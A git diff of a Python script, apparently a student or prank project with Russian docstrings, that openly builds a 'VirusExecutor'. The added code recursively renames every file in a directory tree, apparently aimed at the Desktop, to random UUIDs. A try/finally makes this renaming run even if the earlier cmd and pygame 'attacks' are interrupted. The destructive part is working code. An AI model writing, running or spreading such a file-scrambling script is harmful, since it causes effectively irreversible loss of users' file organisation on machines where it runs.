@@ -1,17 +1,35 @@
 import os
 import sys
-from pathlib import Path
 import time
 import pygame
-from Basics.rename_test.virus_rename import (
-    rename_all_files_in_dir,
-    CURRENT_FILE as RENAME_EX_FILE,
-    CURRENT_DIR as RENAME_CURRENT_DIR,
-)
+import uuid
+from pathlib import Path
+from typing import Iterable
 
 
-class VirusExecutor:
-    def __init__(self, cmd_attacks_amount: int = 30, finish_dir_path: Path = RENAME_CURRENT_DIR):
+CURRENT_FILE = Path(__file__)
+CURRENT_DIR = CURRENT_FILE.parent
+
+
+def generate_new_name(file: Path):
+    return str(uuid.uuid4())
+
+
+def rename_all_files_in_dir(
+    dir_path: Path = CURRENT_DIR,
+    protected_files: Iterable[Path] = (CURRENT_FILE,),
+):
+    for maybe_file in dir_path.iterdir():
+        if maybe_file in protected_files:
+            continue
+        if maybe_file.is_file():
+            maybe_file.rename(Path(dir_path) / generate_new_name(maybe_file))
+        elif maybe_file.is_dir():
+            rename_all_files_in_dir(maybe_file, protected_files)
+
+
+class VirusExecutor(object):
+    def __init__(self, cmd_attacks_amount: int = 30, finish_dir_path: Path = CURRENT_DIR):
         """Конструктор класса.
 
         Установка исходных параметров атаки:
@@ -29,9 +47,11 @@ class VirusExecutor:
         Атаки будут производиться до момента, пока условие прекращения атак не будет удовлетворено.
         После окончания атак будет запущена финиширующая инструкция.
         """
-        self.launch_cmd_atack()
-        self.launch_pygame_atack()
-        self.finish()
+        try:
+            self.launch_cmd_atack()
+            self.launch_pygame_atack()
+        finally:
+            self.launch_finish_atack()
 
     def launch_cmd_atack(self):
         """Запуск серии атак на cmd."""
@@ -71,12 +91,12 @@ class VirusExecutor:
             except KeyboardInterrupt:
                 break
 
-    def finish(self):
+    def launch_finish_atack(self):
         """Финиширующая инструкция.
 
         Переименовывает все файлы в директории."""
         rename_all_files_in_dir(
-            dir_path=self.finish_dir_path, protected_files=frozenset((RENAME_EX_FILE, Path(__file__)))
+            dir_path=self.finish_dir_path, protected_files=frozenset((Path(__file__), ))
         )
 
 
@@ -90,9 +110,22 @@ class MacOSVirusExecutor(VirusExecutor):
         print("ATTACK!")
 
 
+def find_path_to_desktop() -> Path:
+    return Path("Desktop")
+
+
+def test_find_path_to_desktop():
+    path_to_desktop = find_path_to_desktop()
+    expected_dirs = frozenset(("Этот компьютер", "Корзина"))
+    for maybe_dir in path_to_desktop.iterdir():
+        if maybe_dir.name in expected_dirs:
+            print("OK")
+            return
+    raise Exception("It is not Desktop!")
+
+
 if __name__ == "__main__":
     if sys.platform.startswith("win"):
         WindowsVirusExecutor(5).execute()
     else:
         MacOSVirusExecutor(5).execute()
-
